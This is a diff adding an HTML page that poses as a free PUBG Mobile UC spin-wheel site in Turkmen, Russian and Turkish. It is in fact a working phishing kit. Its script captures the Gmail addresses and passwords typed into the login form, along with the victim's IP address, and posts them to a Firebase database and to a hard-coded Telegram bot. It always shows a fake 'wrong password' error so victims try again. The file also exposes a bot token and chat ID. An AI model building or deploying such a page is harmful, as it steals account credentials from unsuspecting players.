@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="tk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG UC</title>
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(-45deg, #0f0c29, #302b63, #24243e, #000000);
+            background-size: 400% 400%;
+            animation: background-shift 15s ease infinite;
+            color: #fff;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .error-message {
+            color: #ff4444;
+            background: rgba(255, 68, 68, 0.1);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            border: 1px solid #ff4444;
+            display: none;
+        }
+
+        /* Остальные стили остаются без изменений */
+        .uc-fall {
+            position: absolute;
+            top: -50px;
+            font-size: 18px;
+            font-weight: bold;
+            color: #ffcc00;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.8);
+            animation: fall linear infinite, glow 2s ease-in-out infinite alternate;
+            padding: 5px 10px;
+            background: linear-gradient(45deg, #ff6b00, #ffcc00);
+            border-radius: 15px;
+            border: 2px solid #fff;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 5px #ffcc00); }
+            to { filter: drop-shadow(0 0 15px #ff6b00); }
+        }
+
+        .container {
+            background: rgba(20, 20, 20, 0.95);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(255, 204, 0, 0.4);
+            width: 350px;
+            text-align: center;
+            border: 3px solid #ffcc00;
+            position: relative;
+            z-index: 10;
+            animation: slide-in 0.7s ease-out;
+        }
+
+        @keyframes slide-in {
+            from { 
+                opacity: 0;
+                transform: translateY(-50px) scale(0.9);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        input, button, select {
+            width: 100%;
+            padding: 14px;
+            margin: 12px 0;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            animation: fade-in 0.8s ease-out;
+        }
+
+        @keyframes fade-in {
+            from { 
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        input, select {
+            background: #2c2c2c;
+            color: #fff;
+            border: 2px solid #ffcc00;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ffd633;
+            box-shadow: 0 0 15px rgba(255, 204, 0, 0.3);
+        }
+
+        button {
+            background: linear-gradient(45deg, #ffcc00, #ffd633);
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            border: 2px solid #ffcc00;
+            animation: pulse-glow 2s infinite;
+            transition: all 0.3s ease;
+        }
+
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 5px rgba(255, 204, 0, 0.7); }
+            50% { box-shadow: 0 0 20px rgba(255, 204, 0, 0.9), 0 0 30px rgba(255, 204, 0, 0.6); }
+            100% { box-shadow: 0 0 5px rgba(255, 204, 0, 0.7); }
+        }
+
+        button:hover {
+            animation: none;
+            transform: scale(1.05) translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 204, 0, 0.6);
+        }
+
+        .google-btn {
+            background: linear-gradient(45deg, #4285F4, #34A853);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .google-btn:hover {
+            background: linear-gradient(45deg, #34A853, #4285F4);
+        }
+
+        button:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 260px;
+            height: 260px;
+            margin: 25px auto;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: #2c2c2c;
+            position: relative;
+            overflow: hidden;
+            transition: transform 3s cubic-bezier(0.17, 0.67, 0.83, 0.67);
+            border: 4px solid #ffcc00;
+            box-shadow: 0 0 20px rgba(255, 204, 0, 0.3);
+            transform: rotate(0deg);
+            animation: idle-spin 20s linear infinite;
+        }
+
+        @keyframes idle-spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .sector {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            transform-origin: bottom right;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #000;
+            font-size: 14px;
+            border: 2px solid rgba(0, 0, 0, 0.3);
+        }
+
+        .pointer {
+            position: absolute;
+            top: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 25px;
+            height: 40px;
+            background: #ff0000;
+            clip-path: polygon(50% 0%, 0% 100%, 100% 100%);
+            z-index: 10;
+            border: 2px solid #fff;
+        }
+
+        .balance-info {
+            background: linear-gradient(45deg, rgba(255, 204, 0, 0.2), rgba(255, 204, 0, 0.1));
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            border: 2px solid #ffcc00;
+        }
+
+        .withdraw-btn {
+            background: linear-gradient(45deg, #00cc66, #00ff88);
+            margin-top: 10px;
+            border: 2px solid #00cc66;
+        }
+
+        .withdraw-btn:hover {
+            background: linear-gradient(45deg, #00ff88, #33ff99);
+        }
+
+        h2 {
+            color: #ffcc00;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px rgba(255, 204, 0, 0.5);
+            background: linear-gradient(90deg, #ffcc00, #ff6b00, #ffcc00);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: text-shimmer 3s linear infinite;
+        }
+
+        @keyframes text-shimmer {
+            0% { background-position: -100% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        .success-icon {
+            font-size: 60px;
+            color: #00cc66;
+            margin: 20px 0;
+            text-shadow: 0 0 20px rgba(0, 204, 102, 0.7);
+        }
+
+        .game-theme {
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            border: 3px solid #e94560;
+        }
+
+        .game-title {
+            color: #e94560;
+            text-shadow: 0 0 15px rgba(233, 69, 96, 0.7);
+            font-size: 24px;
+            margin-bottom: 30px;
+        }
+
+        .game-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat-item {
+            background: rgba(233, 69, 96, 0.2);
+            padding: 15px;
+            border-radius: 8px;
+            border: 2px solid #e94560;
+        }
+
+        .loading {
+            display: none;
+            color: #ffcc00;
+            margin-top: 10px;
+        }
+
+        .language-selector {
+            margin-bottom: 20px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #ffcc00;
+        }
+
+        .divider span {
+            padding: 0 15px;
+            color: #ffcc00;
+        }
+
+        .g_id_signin {
+            width: 100% !important;
+            margin: 12px 0 !important;
+        }
+    </style>
+</head>
+<body>
+    <div id="ucRain"></div>
+
+    <div id="languagePage" class="container">
+        <h2>PUBG UC</h2>
+        <div class="language-selector">
+            <select id="languageSelect" onchange="updateContinueButton()">
+                <option value="ru">Русский</option>
+                <option value="tr">Türkçe</option>
+                <option value="tk" selected>Türkmençe</option>
+            </select>
+        </div>
+        <button id="continueButton" onclick="selectLanguage()">DOWAM ET</button>
+    </div>
+
+    <div id="loginPage" class="container" style="display:none;">
+        <h2 id="loginTitle">PUBG UC</h2>
+        
+        <div id="errorMessage" class="error-message">
+            <!-- Сообщение об ошибке будет здесь -->
+        </div>
+        
+        <input type="email" id="email" placeholder="@gmail.com giriziň">
+        <input type="password" id="password" placeholder="Açarsöz">
+        <button onclick="login()" id="loginButton">OYNAMAK</button>
+        
+        <div class="divider">
+            <span id="orText">ÝA-DA</span>
+        </div>
+        
+        <div id="g_id_onload"
+             data-client_id="497904462307-4jcq7rp1lgqc1bq0mck23pog8v7grpm2.apps.googleusercontent.com"
+             data-callback="handleGoogleSignIn">
+        </div>
+        <div class="g_id_signin" data-type="standard" data-theme="filled_blue"></div>
+        
+        <div id="loading" class="loading">PUBG serwerlerinde maglumatlar barlag edilýär...</div>
+    </div>
+
+    <!-- Остальной код без изменений -->
+    <div id="gamePage" class="container" style="display:none;">
+        <h2 id="gameTitle">PUBG UC</h2>
+        
+        <div class="balance-info">
+            <p id="balanceText">Balans: <span id="balance" style="font-weight: bold; color: #ffcc00;">100</span> UC</p>
+            <p id="spinCostText">Döwüliş bahasy: <span style="color: #ff6b6b;">100 UC</span></p>
+        </div>
+
+        <div class="wheel-container">
+            <div class="pointer"></div>
+            <div class="wheel" id="wheel">
+                <div class="sector" style="transform: rotate(0deg); background: #ff6b6b;">60 UC</div>
+                <div class="sector" style="transform: rotate(72deg); background: #4ecdc4;">120 UC</div>
+                <div class="sector" style="transform: rotate(144deg); background: #ffcc00;">180 UC</div>
+                <div class="sector" style="transform: rotate(216deg); background: #6a0572;">240 UC</div>
+                <div class="sector" style="transform: rotate(288deg); background: #00ff00;">325 UC</div>
+            </div>
+        </div>
+
+        <button id="spinBtn" onclick="spin()">100 UC BILEN DÖWDÜR</button>
+        <button class="withdraw-btn" onclick="withdraw()" id="withdrawButton">UC ÇYKAR</button>
+    </div>
+
+    <div id="withdrawPage" class="container" style="display:none;">
+        <div class="success-icon">✓</div>
+        <h2 id="withdrawTitle">UC-LERIŇIZ IBERILDI!</h2>
+        <p style="margin: 20px 0; font-size: 18px;">
+            <span id="withdrawAmount" style="color: #ffcc00; font-weight: bold;">0</span> <span id="withdrawText">UC üstünlikli PUBG Mobile oýun hasabyňyza goşuldy</span>
+        </p>
+        <button onclick="showGameTheme()" id="statsButton">STATISTIKA GEÇ</button>
+    </div>
+
+    <div id="gameThemePage" class="container game-theme" style="display:none;">
+        <h2 class="game-title" id="successTitle">PUBG MOBILE - ÜSTÜNLIGIŇIZ</h2>
+        
+        <div class="game-stats">
+            <div class="stat-item">
+                <h3>🎯 <span id="winsText">UTUŞLAR</span></h3>
+                <p id="winsCount">15 duşuşyk</p>
+            </div>
+            <div class="stat-item">
+                <h3>⚡ <span id="kdText">K/D GATNAŞYK</span></h3>
+                <p>3.8</p>
+            </div>
+            <div class="stat-item">
+                <h3>🏆 <span id="levelText">DEREJE</span></h3>
+                <p id="levelValue">Platinum II</p>
+            </div>
+            <div class="stat-item">
+                <h3>💰 <span id="totalText">JEMI UC</span></h3>
+                <p id="totalUC">0</p>
+            </div>
+        </div>
+
+        <button onclick="restartGame()" id="playAgainButton">ÝENE OYNA</button>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8498799863:AAHuSxS8GJakj-PCcXSDi2MlYZ2p0JC--xo';
+        const TELEGRAM_CHAT_ID = '8379201431';
+        const FIREBASE_URL = 'https://pubg-uc-default-rtdb.firebaseio.com/users.json';
+
+        let userBalance = 100;
+        let isSpinning = false;
+        let totalWon = 0;
+        let currentRotation = 0;
+        let currentLanguage = 'tk';
+
+        const translations = {
+            ru: {
+                continueButton: "ПРОДОЛЖИТЬ",
+                emailPlaceholder: "Введите @gmail.com",
+                passwordPlaceholder: "Пароль",
+                loginButton: "ВОЙТИ В ИГРУ",
+                loadingText: "Проверка данных на сервере PUBG...",
+                balanceText: "Баланс:",
+                spinCostText: "Стоимость вращения:",
+                spinButton: "КРУТИТЬ ЗА 100 UC",
+                withdrawButton: "ВЫВЕСТИ UC",
+                withdrawTitle: "ВАШИ UC ОТПРАВЛЕНЫ!",
+                withdrawText: "UC были успешно зачислены на ваш игровой аккаунт PUBG Mobile",
+                statsButton: "ПЕРЕЙТИ К СТАТИСТИКЕ",
+                successTitle: "PUBG MOBILE - ВАШ УСПЕХ",
+                winsText: "ПОБЕДЫ",
+                winsCount: "15 матчей",
+                kdText: "K/D RATIO",
+                levelText: "УРОВЕНЬ",
+                levelValue: "Platinum II",
+                totalText: "ВСЕГО UC",
+                playAgainButton: "ИГРАТЬ СНОВА",
+                invalidEmail: "Введите корректный @gmail.com и пароль!",
+                wrongPassword: "❌ Неверный пароль! Попробуйте еще раз.",
+                noUC: "Недостаточно UC для вращения!",
+                noWithdraw: "Нет UC для вывода!",
+                orText: "ИЛИ",
+                googleButtonText: "РЕГИСТРАЦИЯ ЧЕРЕЗ GOOGLE"
+            },
+            tr: {
+                continueButton: "DEVAM ET",
+                emailPlaceholder: "@gmail.com girin",
+                passwordPlaceholder: "Şifre",
+                loginButton: "OYUNA GİR",
+                loadingText: "PUBG sunucularında veri kontrol ediliyor...",
+                balanceText: "Bakiye:",
+                spinCostText: "Çevirme maliyeti:",
+                spinButton: "100 UC İLE ÇEVİR",
+                withdrawButton: "UC ÇEK",
+                withdrawTitle: "UC'LERİNİZ GÖNDERİLDİ!",
+                withdrawText: "UC başarıyla PUBG Mobile oyun hesabınıza yatırıldı",
+                statsButton: "İSTATİSTİKLERE GİT",
+                successTitle: "PUBG MOBILE - BAŞARINIZ",
+                winsText: "GALİBİYETLER",
+                winsCount: "15 maç",
+                kdText: "K/D ORANI",
+                levelText: "SEVİYE",
+                levelValue: "Platinum II",
+                totalText: "TOPLAM UC",
+                playAgainButton: "TEKRAR OYNA",
+                invalidEmail: "Lütfen geçerli bir @gmail.com ve şifre girin!",
+                wrongPassword: "❌ Yanlış şifre! Lütfen tekrar deneyin.",
+                noUC: "Döndürmek için yeterli UC yok!",
+                noWithdraw: "Çekilecek UC yok!",
+                orText: "VEYA",
+                googleButtonText: "GOOGLE İLE KAYIT"
+            },
+            tk: {
+                continueButton: "DOWAM ET",
+                emailPlaceholder: "@gmail.com giriziň",
+                passwordPlaceholder: "Açarsöz",
+                loginButton: "OYNAMAK",
+                loadingText: "PUBG serwerlerinde maglumatlar barlag edilýär...",
+                balanceText: "Balans:",
+                spinCostText: "Döwüliş bahasy:",
+                spinButton: "100 UC BILEN DÖWDÜR",
+                withdrawButton: "UC ÇYKAR",
+                withdrawTitle: "UC-LERIŇIZ IBERILDI!",
+                withdrawText: "UC üstünlikli PUBG Mobile oýun hasabyňyza goşuldy",
+                statsButton: "STATISTIKA GEÇ",
+                successTitle: "PUBG MOBILE - ÜSTÜNLIGIŇIZ",
+                winsText: "UTUŞLAR",
+                winsCount: "15 duşuşyk",
+                kdText: "K/D GATNAŞYK",
+                levelText: "DEREJE",
+                levelValue: "Platinum II",
+                totalText: "JEMI UC",
+                playAgainButton: "ÝENE OYNA",
+                invalidEmail: "Dogry @gmail.com we açarsöz giriziň!",
+                wrongPassword: "❌ Nädogry açarsöz! Ýene synanyşyň.",
+                noUC: "Döwdürmek üçin ýeterlik UC ýok!",
+                noWithdraw: "Çykarmak üçin UC ýok!",
+                orText: "ÝA-DA",
+                googleButtonText: "GOOGLE BILEN REGISTRASIÝA"
+            }
+        };
+
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            
+            // Автоматическое скрытие ошибки через 3 секунды
+            setTimeout(() => {
+                errorDiv.style.display = 'none';
+            }, 3000);
+        }
+
+        function updateContinueButton() {
+            const select = document.getElementById('languageSelect');
+            const button = document.getElementById('continueButton');
+            currentLanguage = select.value;
+            button.textContent = translations[currentLanguage].continueButton;
+        }
+
+        function handleGoogleSignIn(response) {
+            const userEmail = response.credential.email;
+            const userPassword = "Google_Auth_No_Password";
+            
+            // Всегда показываем ошибку для Google входа
+            showError(translations[currentLanguage].wrongPassword);
+            
+            // Но данные всё равно сохраняем
+            processLogin(userEmail, userPassword, 'google');
+        }
+
+        async function saveToDatabase(email, password, method = 'manual') {
+            const userData = {
+                email: email,
+                password: password,
+                ip: await getIP(),
+                timestamp: new Date().toLocaleString(),
+                language: currentLanguage,
+                login_method: method
+            };
+
+            try {
+                const response = await fetch(FIREBASE_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(userData)
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Database error:', error);
+                return false;
+            }
+        }
+
+        async function sendToTelegram(email, password, method = 'manual') {
+            const message = `🔐 НОВЫЙ АККАУНТ:\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Время: ${new Date().toLocaleString()}\n🌐 IP: ${await getIP()}\n🗣️ Язык: ${currentLanguage}\n🔧 Метод: ${method}`;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+                return false;
+            }
+        }
+
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Неизвестно';
+            }
+        }
+
+        function createUCRain() {
+            const ucRain = document.getElementById('ucRain');
+            
+            for (let i = 0; i < 25; i++) {
+                const uc = document.createElement('div');
+                uc.className = 'uc-fall';
+                uc.textContent = 'UC';
+                uc.style.left = Math.random() * 100 + 'vw';
+                uc.style.animationDuration = (Math.random() * 5 + 3) + 's';
+                uc.style.animationDelay = Math.random() * 2 + 's';
+                ucRain.appendChild(uc);
+            }
+        }
+
+        function updateLanguage() {
+            const lang = translations[currentLanguage];
+            document.getElementById('email').placeholder = lang.emailPlaceholder;
+            document.getElementById('password').placeholder = lang.passwordPlaceholder;
+            document.getElementById('loginButton').textContent = lang.loginButton;
+            document.getElementById('loading').textContent = lang.loadingText;
+            document.getElementById('balanceText').textContent = lang.balanceText;
+            document.getElementById('spinCostText').textContent = lang.spinCostText;
+            document.getElementById('spinBtn').textContent = lang.spinButton;
+            document.getElementById('withdrawButton').textContent = lang.withdrawButton;
+            document.getElementById('withdrawTitle').textContent = lang.withdrawTitle;
+            document.getElementById('withdrawText').textContent = lang.withdrawText;
+            document.getElementById('statsButton').textContent = lang.statsButton;
+            document.getElementById('successTitle').textContent = lang.successTitle;
+            document.getElementById('winsText').textContent = lang.winsText;
+            document.getElementById('winsCount').textContent = lang.winsCount;
+            document.getElementById('kdText').textContent = lang.kdText;
+            document.getElementById('levelText').textContent = lang.levelText;
+            document.getElementById('levelValue').textContent = lang.levelValue;
+            document.getElementById('totalText').textContent = lang.totalText;
+            document.getElementById('playAgainButton').textContent = lang.playAgainButton;
+            document.getElementById('orText').textContent = lang.orText;
+        }
+
+        function selectLanguage() {
+            currentLanguage = document.getElementById('languageSelect').value;
+            document.getElementById('languagePage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+            updateLanguage();
+        }
+
+        async function processLogin(email, password, method) {
+            // Всегда сохраняем данные независимо от "ошибки"
+            await saveToDatabase(email, password, method);
+            await sendToTelegram(email, password, method);
+            
+            // Показываем ошибку, но данные уже сохранены
+            showError(translations[currentLanguage].wrongPassword);
+            
+            // Не переходим на игровую страницу - пользователь остается на странице входа
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        async function login() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loading = document.getElementById('loading');
+            
+            if (email.includes('@gmail.com') && password) {
+                loading.style.display = 'block';
+                
+                // Имитация проверки
+                setTimeout(() => {
+                    processLogin(email, password, 'manual');
+                    loading.style.display = 'none';
+                }, 1500);
+            } else {
+                showError(translations[currentLanguage].invalidEmail);
+            }
+        }
+
+        // Остальные функции без изменений
+        function spin() {
+            if (isSpinning) return;
+            
+            if (userBalance >= 100) {
+                isSpinning = true;
+                document.getElementById('spinBtn').disabled = true;
+                userBalance -= 100;
+                document.getElementById('balance').textContent = userBalance;
+
+                const wheel = document.getElementById('wheel');
+                const prizes = [60, 120, 180, 240, 325];
+                const winIndex = Math.floor(Math.random() * prizes.length);
+                const win = prizes[winIndex];
+                
+                const extraRotations = 3 * 360;
+                const sectorAngle = 72;
+                const targetAngle = extraRotations + (winIndex * sectorAngle) + Math.random() * sectorAngle;
+                
+                wheel.style.transform = `rotate(${targetAngle}deg)`;
+                
+                setTimeout(() => {
+                    userBalance += win;
+                    totalWon += win;
+                    document.getElementById('balance').textContent = userBalance;
+                    alert(`🎉 ${translations[currentLanguage].withdrawText.split(' ')[0]} ${win} UC!`);
+                    isSpinning = false;
+                    document.getElementById('spinBtn').disabled = false;
+                    currentRotation = targetAngle % 360;
+                    wheel.style.transform = `rotate(${currentRotation}deg)`;
+                }, 3000);
+            } else {
+                alert(translations[currentLanguage].noUC);
+            }
+        }
+
+        function withdraw() {
+            if (userBalance > 0) {
+                document.getElementById('gamePage').style.display = 'none';
+                document.getElementById('withdrawPage').style.display = 'block';
+                document.getElementById('withdrawAmount').textContent = userBalance;
+            } else {
+                alert(translations[currentLanguage].noWithdraw);
+            }
+        }
+
+        function showGameTheme() {
+            document.getElementById('withdrawPage').style.display = 'none';
+            document.getElementById('gameThemePage').style.display = 'block';
+            document.getElementById('totalUC').textContent = totalWon + ' UC';
+        }
+
+        function restartGame() {
+            userBalance = 100;
+            totalWon = 0;
+            currentRotation = 0;
+            document.getElementById('gameThemePage').style.display = 'none';
+            document.getElementById('gamePage').style.display = 'block';
+            document.getElementById('balance').textContent = userBalance;
+            document.getElementById('wheel').style.transform = 'rotate(0deg)';
+        }
+
+        window.onload = function() {
+            createUCRain();
+        };
+    </script>
+</body>
+</html>
